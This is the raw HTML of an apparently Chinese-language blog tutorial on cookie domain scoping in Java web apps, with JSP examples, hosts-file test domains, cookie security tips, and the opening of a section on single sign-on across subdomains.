<span> <a target="_blank" href="http://blog.csdn.net/ghsau/article/details/20395681" class="PrintSource" title="print" style="text-decoration:none; border:none; padding:0px; margin:0px 10px 0px 0px; font-size:9px; color:rgb(12,137,207); background-color:inherit">print</a></span><a target="_blank" href="http://blog.csdn.net/ghsau/article/details/20395681" class="About" title="?" style="text-decoration:none; border:none; padding:0px; margin:0px 10px 0px 0px; font-size:9px; color:rgb(12,137,207); background-color:inherit">?</a><span class="tracking-ad"><a target="_blank" href="https://code.csdn.net/snippets/216375" title="在CODE上查看代码片" style="text-decoration:none; border:none; padding:0px; margin:0px 10px 0px 0px; font-size:9px; color:rgb(12,137,207); background-color:inherit"><img src="https://code.csdn.net/assets/CODE_ico.png" width="12" height="12" alt="在CODE上查看代码片" style="border:none; position:relative; top:1px; left:2px" /></a></span><span class="tracking-ad"><a target="_blank" href="https://code.csdn.net/snippets/216375/fork" title="派生到我的代码片" style="text-decoration:none; border:none; padding:0px; margin:0px 10px 0px 0px; font-size:9px; color:rgb(12,137,207); background-color:inherit"><img src="https://code.csdn.net/assets/ico_fork.svg" width="12" height="12" alt="派生到我的代码片" style="border:none; position:relative; top:2px; left:2px" /></a></span></div>&#13;
</div>&#13;
<ol start="1" class="dp-xml" style="padding:0px; border:none; color:rgb(92,92,92); margin:0px 0px 1px 45px!important; background-color:rgb(255,255,255)">&#13;
<li class="alt" style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:inherit; line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit"><span style="margin:0px; padding:0px; border:none; background-color:inherit">127.0.0.1 web1.ghsau.com  </span></span></li><li style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:rgb(85,85,85); line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">127.0.0.1 web2.ghsau.com  </span></li><li class="alt" style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:inherit; line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">  </span></li><li style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:rgb(85,85,85); line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">127.0.0.1 web1.com  </span></li><li class="alt" style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:inherit; line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">127.0.0.1 web2.com  </span></li></ol>&#13;
</div>&#13;
<span style="color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">       前两个是2级域名(ghsau.com)相同，3级域名(web1、web2)不同，后两个是2级域名不同。然后我们再写两个jsp，一个用于设置Cookie，另一个用于显示Cookie。</span><br style="color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px" />&#13;
<span style="color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">       SetCookie.jsp：</span><br style="color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px" />&#13;
<div class="dp-highlighter bg_html" style="font-family:Consolas,'Courier New',Courier,mono,serif; width:938.516px; overflow:hidden; padding-top:1px; border-color:rgb(204,204,204); color:rgb(85,85,85); line-height:35px; margin:18px 0px!important; background-color:rgb(231,229,220)">&#13;
<div class="bar" style="padding-left:45px">&#13;
<div class="tools" style="padding:3px 8px 10px 10px; font-size:9px; line-height:normal; font-family:Verdana,Geneva,Arial,Helvetica,sans-serif; color:silver; border-left-width:3px; border-left-style:solid; border-left-color:rgb(153,153,153); background-color:rgb(248,248,248)">&#13;
<strong>[html]</strong> <a target="_blank" href="http://blog.csdn.net/ghsau/article/details/20395681" class="ViewSource" title="view plain" style="text-decoration:none; border:none; padding:0px; margin:0px 10px 0px 0px; font-size:9px; color:rgb(12,137,207); background-color:inherit">view&#13;
 plain</a><span> <a target="_blank" href="http://blog.csdn.net/ghsau/article/details/20395681" class="CopyToClipboard" title="copy" style="text-decoration:none; border:none; padding:0px; margin:0px 10px 0px 0px; font-size:9px; color:rgb(12,137,207); background-color:inherit">copy</a></span>&#13;
<div style="position:absolute; left:476px; top:2677px; width:27px; height:15px; z-index:99">&#13;
</div>&#13;
<span> <a target="_blank" href="http://blog.csdn.net/ghsau/article/details/20395681" class="PrintSource" title="print" style="text-decoration:none; border:none; padding:0px; margin:0px 10px 0px 0px; font-size:9px; color:rgb(12,137,207); background-color:inherit">print</a></span><a target="_blank" href="http://blog.csdn.net/ghsau/article/details/20395681" class="About" title="?" style="text-decoration:none; border:none; padding:0px; margin:0px 10px 0px 0px; font-size:9px; color:rgb(12,137,207); background-color:inherit">?</a><span class="tracking-ad"><a target="_blank" href="https://code.csdn.net/snippets/216375" title="在CODE上查看代码片" style="text-decoration:none; border:none; padding:0px; margin:0px 10px 0px 0px; font-size:9px; color:rgb(12,137,207); background-color:inherit"><img src="https://code.csdn.net/assets/CODE_ico.png" width="12" height="12" alt="在CODE上查看代码片" style="border:none; position:relative; top:1px; left:2px" /></a></span><span class="tracking-ad"><a target="_blank" href="https://code.csdn.net/snippets/216375/fork" title="派生到我的代码片" style="text-decoration:none; border:none; padding:0px; margin:0px 10px 0px 0px; font-size:9px; color:rgb(12,137,207); background-color:inherit"><img src="https://code.csdn.net/assets/ico_fork.svg" width="12" height="12" alt="派生到我的代码片" style="border:none; position:relative; top:2px; left:2px" /></a></span></div>&#13;
</div>&#13;
<ol start="1" class="dp-xml" style="padding:0px; border:none; color:rgb(92,92,92); margin:0px 0px 1px 45px!important; background-color:rgb(255,255,255)">&#13;
<li class="alt" style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:inherit; line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit"><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">%@ page </span><span class="attribute" style="margin:0px; padding:0px; border:none; color:red; background-color:inherit">language</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">=</span><span class="attribute-value" style="margin:0px; padding:0px; border:none; color:blue; background-color:inherit">"java"</span><span style="margin:0px; padding:0px; border:none; background-color:inherit"> </span><span class="attribute" style="margin:0px; padding:0px; border:none; color:red; background-color:inherit">contentType</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">=</span><span class="attribute-value" style="margin:0px; padding:0px; border:none; color:blue; background-color:inherit">"text/html; charset=utf-8"</span><span style="margin:0px; padding:0px; border:none; background-color:inherit"> </span><span class="attribute" style="margin:0px; padding:0px; border:none; color:red; background-color:inherit">pageEncoding</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">=</span><span class="attribute-value" style="margin:0px; padding:0px; border:none; color:blue; background-color:inherit">"utf-8"</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">%</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:rgb(85,85,85); line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit"><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">%  </span></span></li><li class="alt" style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:inherit; line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">    Cookie <span class="attribute" style="margin:0px; padding:0px; border:none; color:red; background-color:inherit">cookie</span><span style="margin:0px; padding:0px; border:none; background-color:inherit"> = </span><span class="attribute-value" style="margin:0px; padding:0px; border:none; color:blue; background-color:inherit">new</span><span style="margin:0px; padding:0px; border:none; background-color:inherit"> Cookie("test_key", "test_value");  </span></span></li><li style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:rgb(85,85,85); line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">    cookie.setPath("/");  </span></li><li class="alt" style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:inherit; line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">//  cookie.setDomain(".ghsau.com");  </span></li><li style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:rgb(85,85,85); line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">    response.addCookie(cookie);  </span></li><li class="alt" style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:inherit; line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">%<span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li></ol>&#13;
</div>&#13;
<span style="color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">      ShowCookie.jsp：</span>&#13;
<div class="dp-highlighter bg_html" style="font-family:Consolas,'Courier New',Courier,mono,serif; width:938.516px; overflow:hidden; padding-top:1px; border-color:rgb(204,204,204); color:rgb(85,85,85); line-height:35px; margin:18px 0px!important; background-color:rgb(231,229,220)">&#13;
<div class="bar" style="padding-left:45px">&#13;
<div class="tools" style="padding:3px 8px 10px 10px; font-size:9px; line-height:normal; font-family:Verdana,Geneva,Arial,Helvetica,sans-serif; color:silver; border-left-width:3px; border-left-style:solid; border-left-color:rgb(153,153,153); background-color:rgb(248,248,248)">&#13;
<strong>[html]</strong> <a target="_blank" href="http://blog.csdn.net/ghsau/article/details/20395681" class="ViewSource" title="view plain" style="text-decoration:none; border:none; padding:0px; margin:0px 10px 0px 0px; font-size:9px; color:rgb(12,137,207); background-color:inherit">view&#13;
 plain</a><span> <a target="_blank" href="http://blog.csdn.net/ghsau/article/details/20395681" class="CopyToClipboard" title="copy" style="text-decoration:none; border:none; padding:0px; margin:0px 10px 0px 0px; font-size:9px; color:rgb(12,137,207); background-color:inherit">copy</a></span>&#13;
<div style="position:absolute; left:476px; top:2904px; width:27px; height:15px; z-index:99">&#13;
</div>&#13;
<span> <a target="_blank" href="http://blog.csdn.net/ghsau/article/details/20395681" class="PrintSource" title="print" style="text-decoration:none; border:none; padding:0px; margin:0px 10px 0px 0px; font-size:9px; color:rgb(12,137,207); background-color:inherit">print</a></span><a target="_blank" href="http://blog.csdn.net/ghsau/article/details/20395681" class="About" title="?" style="text-decoration:none; border:none; padding:0px; margin:0px 10px 0px 0px; font-size:9px; color:rgb(12,137,207); background-color:inherit">?</a><span class="tracking-ad"><a target="_blank" href="https://code.csdn.net/snippets/216375" title="在CODE上查看代码片" style="text-decoration:none; border:none; padding:0px; margin:0px 10px 0px 0px; font-size:9px; color:rgb(12,137,207); background-color:inherit"><img src="https://code.csdn.net/assets/CODE_ico.png" width="12" height="12" alt="在CODE上查看代码片" style="border:none; position:relative; top:1px; left:2px" /></a></span><span class="tracking-ad"><a target="_blank" href="https://code.csdn.net/snippets/216375/fork" title="派生到我的代码片" style="text-decoration:none; border:none; padding:0px; margin:0px 10px 0px 0px; font-size:9px; color:rgb(12,137,207); background-color:inherit"><img src="https://code.csdn.net/assets/ico_fork.svg" width="12" height="12" alt="派生到我的代码片" style="border:none; position:relative; top:2px; left:2px" /></a></span></div>&#13;
</div>&#13;
<ol start="1" class="dp-xml" style="padding:0px; border:none; color:rgb(92,92,92); margin:0px 0px 1px 45px!important; background-color:rgb(255,255,255)">&#13;
<li class="alt" style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:inherit; line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit"><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">%@ page </span><span class="attribute" style="margin:0px; padding:0px; border:none; color:red; background-color:inherit">language</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">=</span><span class="attribute-value" style="margin:0px; padding:0px; border:none; color:blue; background-color:inherit">"java"</span><span style="margin:0px; padding:0px; border:none; background-color:inherit"> </span><span class="attribute" style="margin:0px; padding:0px; border:none; color:red; background-color:inherit">contentType</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">=</span><span class="attribute-value" style="margin:0px; padding:0px; border:none; color:blue; background-color:inherit">"text/html; charset=utf-8"</span><span style="margin:0px; padding:0px; border:none; background-color:inherit"> </span><span class="attribute" style="margin:0px; padding:0px; border:none; color:red; background-color:inherit">pageEncoding</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">=</span><span class="attribute-value" style="margin:0px; padding:0px; border:none; color:blue; background-color:inherit">"utf-8"</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">%</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:rgb(85,85,85); line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit"><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">%  </span></span></li><li class="alt" style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:inherit; line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">    // 输出cookies，过滤掉JSESSIONID  </span></li><li style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:rgb(85,85,85); line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">    Cookie[] <span class="attribute" style="margin:0px; padding:0px; border:none; color:red; background-color:inherit">cookies</span><span style="margin:0px; padding:0px; border:none; background-color:inherit"> = </span><span class="attribute-value" style="margin:0px; padding:0px; border:none; color:blue; background-color:inherit">request</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">.getCookies();  </span></span></li><li class="alt" style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:inherit; line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">    if(cookies != null)  </span></li><li style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:rgb(85,85,85); line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">        for(Cookie cookie : cookies) {  </span></li><li class="alt" style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:inherit; line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">            if(cookie.getName().equals("JSESSIONID"))    continue;  </span></li><li style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:rgb(85,85,85); line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">            out.println(cookie.getName() + "-" + cookie.getValue());  </span></li><li class="alt" style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:inherit; line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">        }  </span></li><li style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:rgb(85,85,85); line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">%<span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li></ol>&#13;
</div>&#13;
<span style="color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">       将这两个jsp放到应用后，部署到服务器中，启动服务器，我们就可以通过域名来访问了。</span><br style="color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px" />&#13;
<span style="color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">       测试一，首先访问http://</span><span style="color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">web1.ghsau.com:8080</span><span style="color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">/WebSSOAuth/SetCookie.jsp，设置cookie后，再访问http://</span><span style="color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">web1.ghsau.com:8080</span><span style="color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">/WebSSOAuth/ShowCookie.jsp，页面输出test_key=test_value，这时我们访问http://</span><span style="color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">web2.ghsau.com:8080</span><span style="color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">/WebSSOAuth/ShowCookie.jsp，发现页面什么都没有输出，这时我们得出结论，</span><span style="color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">cookie默认情况下作用域为当前域名</span><span style="color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">。</span><br style="color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px" />&#13;
<span style="color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">       测试二，将SetCookie.jsp第五行注释打开，按照上面的顺序依次访问，我们发现http://</span><span style="color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">web2.<strong>ghsau</strong>.com:8080</span><span style="color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">/WebSSOAuth/ShowCookie.jsp中输出了http://</span><span style="color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">web1.<strong>ghsau</strong>.com:8080</span><span style="color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">/WebSSOAuth/SetCookie.jsp中设置的cookie，这时我们得出结论，</span><span style="color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">cookie作用域为父级域名时，所有子级域名都可以得到该cookie</span><span style="color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">，这也是实现跨子域SSO的关键。这时有些朋友可能会想到那我把cookie作用域设置到顶级域名(.com、.net)上，是不是用该顶级域名的网站就都能获取该cookie了？这样设置的cookie，浏览器是不存储的，无效的cookie。</span><br style="color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px" />&#13;
<p style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">&#13;
       测试三，修改SetCookie.jsp第五行代码为cookie.setDomain(".web2.com")，首先访问http://<em><strong>web1</strong>.com:8080</em>/WebSSOAuth/SetCookie.jsp，设置cookie后，这时我们访问http://<em><strong>web2</strong>.com:8080</em>/WebSSOAuth/ShowCookie.jsp，发现页面什么都没有输出，这时我们得出结论，<u>cookie不能跨二级域名设置</u>。</p>&#13;
<p style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">&#13;
<strong>Cookie安全性</strong></p>&#13;
<p style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">&#13;
       cookie中的数据通常会包含用户的隐私数据，首先要保证数据的保密性，其次要保证数据不能被伪造或者篡改，基于这两点，我们通常需要对cookie内容进行加密，加密方式一般使用对称加密(单密钥，如<a target="_blank" href="http://baike.baidu.com/view/878529.htm?fromId=7510" style="text-decoration:none; color:rgb(12,137,207)">DES</a>)或非对称加密(一对密钥，如<a target="_blank" href="http://baike.baidu.com/view/10613.htm?fromId=7520" style="text-decoration:none; color:rgb(12,137,207)">RSA</a>)，密钥需要保存在服务器端一个安全的地方，这样，别人不知道密钥时，无法对数据进行解密，也无法伪造或篡改数据。另外，像上文提到的，重要的cookie数据需要设置成HttpOnly的，避免跨站脚本获取你的cookie，保证了cookie在浏览器端的安全性。还有我们可以设置cookie只作用于安全的协议(https)，JavaEE中可以通过Cookie类的setSecure(boolean&#13;
 flag)来设置，设置后，该cookie只会在https下发送，而不会再http下发送，保证了cookie在服务器端的安全性，服务器https的设置可以参照<a target="_blank" href="http://blog.csdn.net/lifetragedy/article/details/7699236" style="text-decoration:none; color:rgb(12,137,207)">该文章</a>。</p>&#13;
<br />&#13;
</div>&#13;
<h1>共同父域名下的单点登录</h1>&#13;
<div><br />&#13;
</div>&#13;
<div>&#13;
<p style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">&#13;
单点登录(Single Sign On)，简称为SSO，SSO不仅在企业级开发很常用，在互联网中更是大行其道。随便举几个例子，比如我们登录新浪微博后，再访问新浪首页后，我们发现，已经自动登录了；再比如我们登录CSDN后，可以写博客、逛论坛、下载资源等等。前者是完全跨域的单点登录，下文会讲，后者是共同父域下(www.csdn.net、blog.csdn.net、bbs.csdn.net、passport.csdn.net)的单点登录，也就是本文的主要内容。<br />&#13;
       单点登录实际上是“身份认证”的整合，当我们存在多个应用时，我们希望登录了其中的一个应用，再访问其他应用时，会自动登录，避免用户重复的体力劳动。单点登录的实现原理是比较简单的，如下图所示，当用户通过浏览器第一次访问应用系统1时，由于还没有登录，会被引导到认证系统进行登录。下面开始单点登录的过程：<span style="color:rgb(51,51,255)">认证系统根据用户在浏览器中输入的登录信息，进行身份认证，如果认证通过，返回给浏览器一个证明ticket(票)；用户再访问其它应用系统时，会带着ticket；应用系统接收到ticket后，会将其发送到认证系统进行合法性校验；校验通过后，用户就不需要再次输入用户名密码来登录了，从而实现了单点登录的功能</span>。<img src="http://img.blog.csdn.net/20140304211546578?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2hzYXU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="" style="border:none; max-width:602px; height:auto" /></p>&#13;
<p style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">&#13;
       上面描述的过程实际上是WEB-SSO。要实现SSO，首先必须要有统一的认证系统，其次每个应用系统都通过认证系统来校验用户，所以这需要两方面的配合。WEB-SSO是比较好实现的，尤其是共同父域的情况下，我们可以通过浏览器的cookie来保存ticket。今天我用Servlet技术实现了SSO的主要功能，可以在<a target="_blank" href="http://download.csdn.net/detail/ghsau/6993043" style="text-decoration:none; color:rgb(12,137,207)">这里</a>下载项目。<br />&#13;
</p>&#13;
<p style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">&#13;
<strong>域名准备</strong></p>&#13;
<p style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">&#13;
<strong>       </strong>修改hosts文件，映射3个域名：</p>&#13;
<div class="dp-highlighter bg_html" style="font-family:Consolas,'Courier New',Courier,mono,serif; width:938.516px; overflow:hidden; padding-top:1px; border-color:rgb(204,204,204); color:rgb(85,85,85); line-height:35px; margin:18px 0px!important; background-color:rgb(231,229,220)">&#13;
<div class="bar" style="padding-left:45px">&#13;
<div class="tools" style="padding:3px 8px 10px 10px; font-size:9px; line-height:normal; font-family:Verdana,Geneva,Arial,Helvetica,sans-serif; color:silver; border-left-width:3px; border-left-style:solid; border-left-color:rgb(153,153,153); background-color:rgb(248,248,248)">&#13;
<strong>[html]</strong> <a target="_blank" href="http://blog.csdn.net/ghsau/article/details/20466351" class="ViewSource" title="view plain" style="text-decoration:none; border:none; padding:0px; margin:0px 10px 0px 0px; font-size:9px; color:rgb(12,137,207); background-color:inherit">view&#13;
 plain</a><span> <a target="_blank" href="http://blog.csdn.net/ghsau/article/details/20466351" class="CopyToClipboard" title="copy" style="text-decoration:none; border:none; padding:0px; margin:0px 10px 0px 0px; font-size:9px; color:rgb(12,137,207); background-color:inherit">copy</a></span>&#13;
<div style="position:absolute; left:476px; top:1592px; width:27px; height:15px; z-index:99">&#13;
</div>&#13;
<span> <a target="_blank" href="http://blog.csdn.net/ghsau/article/details/20466351" class="PrintSource" title="print" style="text-decoration:none; border:none; padding:0px; margin:0px 10px 0px 0px; font-size:9px; color:rgb(12,137,207); background-color:inherit">print</a></span><a target="_blank" href="http://blog.csdn.net/ghsau/article/details/20466351" class="About" title="?" style="text-decoration:none; border:none; padding:0px; margin:0px 10px 0px 0px; font-size:9px; color:rgb(12,137,207); background-color:inherit">?</a><span class="tracking-ad"><a target="_blank" href="https://code.csdn.net/snippets/217752" title="在CODE上查看代码片" style="text-decoration:none; border:none; padding:0px; margin:0px 10px 0px 0px; font-size:9px; color:rgb(12,137,207); background-color:inherit"><img src="https://code.csdn.net/assets/CODE_ico.png" width="12" height="12" alt="在CODE上查看代码片" style="border:none; position:relative; top:1px; left:2px" /></a></span><span class="tracking-ad"><a target="_blank" href="https://code.csdn.net/snippets/217752/fork" title="派生到我的代码片" style="text-decoration:none; border:none; padding:0px; margin:0px 10px 0px 0px; font-size:9px; color:rgb(12,137,207); background-color:inherit"><img src="https://code.csdn.net/assets/ico_fork.svg" width="12" height="12" alt="派生到我的代码片" style="border:none; position:relative; top:2px; left:2px" /></a></span></div>&#13;
</div>&#13;
<ol start="1" class="dp-xml" style="padding:0px; border:none; color:rgb(92,92,92); margin:0px 0px 1px 45px!important; background-color:rgb(255,255,255)">&#13;
<li class="alt" style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:inherit; line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit"><span style="margin:0px; padding:0px; border:none; background-color:inherit">127.0.0.1 web1.ghsau.com  </span></span></li><li style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:rgb(85,85,85); line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">127.0.0.1 web2.ghsau.com  </span></li><li class="alt" style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:inherit; line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">127.0.0.1 passport.ghsau.com  </span></li></ol>&#13;
</div>&#13;
<span style="color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">       3个域名必须拥有共同父域(.ghsau.com)，web1和web2用于访问应用系统，passport用于访问认证系统。</span>&#13;
